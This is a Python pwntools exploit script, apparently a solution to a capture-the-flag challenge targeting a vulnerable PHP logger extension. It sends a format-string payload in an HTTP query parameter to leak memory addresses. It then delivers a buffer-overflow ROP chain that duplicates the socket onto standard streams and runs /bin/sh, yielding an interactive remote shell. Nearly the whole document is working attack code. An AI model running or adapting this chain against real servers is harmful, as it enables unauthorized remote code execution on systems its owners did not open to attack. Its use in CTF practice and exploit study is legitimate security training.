from pwn import *
import urllib.parse

context.word_size = 64 # Ojo con esto porque sino tendras problemas al hacer rop(php)
context.arch = 'amd64'

def xor(xor_key, data):

    salida = bytearray(b"")

    for elem in data:
        salida.append(xor_key ^ elem)

    return salida

server = "94.237.58.171"
port = 32120

server = "127.0.0.1"
port = 1337

elf = ELF("../challenge/php_logger.so")
libc = ELF("./libc.so.6")
php = ELF("./php")

io = remote(server, port)

offset = 152

xor_key = 1

padding = xor(xor_key, b"%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p".ljust(offset, b"A"))

payload = b"".join([
    padding,
    b"\x40\x54"
    #b"\x41\x42"
])

request_data = b"".join([
    b"GET /?cmd=",
    urllib.parse.quote_from_bytes(payload).encode(),
    b" HTTP/1.1\r\n",
    b"Host: 127.0.0.1\r\n",
    f"CMD_KEY: {str(xor_key)}\r\n".encode(),
    b"\r\n"
])

io.sendline(request_data)

io.recvuntil(b"0x")
leak_addresses = b"0x" + io.recv(1024)

leak_addresses = leak_addresses.decode(errors='ignore').split(".")

leak_pie = int(leak_addresses[8], 16)

print(leak_addresses)

print(f"Leak Pie: {hex(leak_pie)}")

elf.address = (leak_pie - 136) - elf.sym.zif_log_cmd

print(f"Address Binary: {hex(elf.sym.zif_log_cmd)}")

leak_php = int(leak_addresses[11], 16)

print(f"Leak PHP: {hex(leak_php)}")

php.address = leak_php - php.sym.executor_globals

print(f"execute_ex Address: {hex(php.sym.execute_ex)}")

stack_base = int(leak_addresses[0], 16) - 0x1c730

print(f"Stack Base Address: {hex(stack_base)}")

base_address = php.address

"""
fd[0] => socket_bind(server:1337, attacker:53542)
fd[1] => socket_bind(server:1337, attacker:53542)
fd[2] => socket_bind(server:1337, attacker:53542)
fd[3] => 0.0.0.0:1337 (listen server)
fd[4] => socket_bind(server:1337, attacker:53542)

"""
rop = ROP(php)

rop.call('dup2', [4, 0])
rop.call('dup2', [4, 1])
rop.call('dup2', [4, 2])

binsh = next(php.search(b"/bin/sh\x00"))

rop.call('execl', [binsh, binsh, 0])

payload = b'A' * offset
payload += rop.chain()


request_data = b"".join([
    b"GET /?cmd=",
    urllib.parse.quote_from_bytes(payload).encode(),
    b" HTTP/1.1\r\n",
    b"Host: 127.0.0.1\r\n",
    f"CMD_KEY: {str(xor_key)}\r\n".encode(),
    b"\r\n"
])

io.close()

io = remote(server, port)

io.sendline(request_data)

io.interactive()
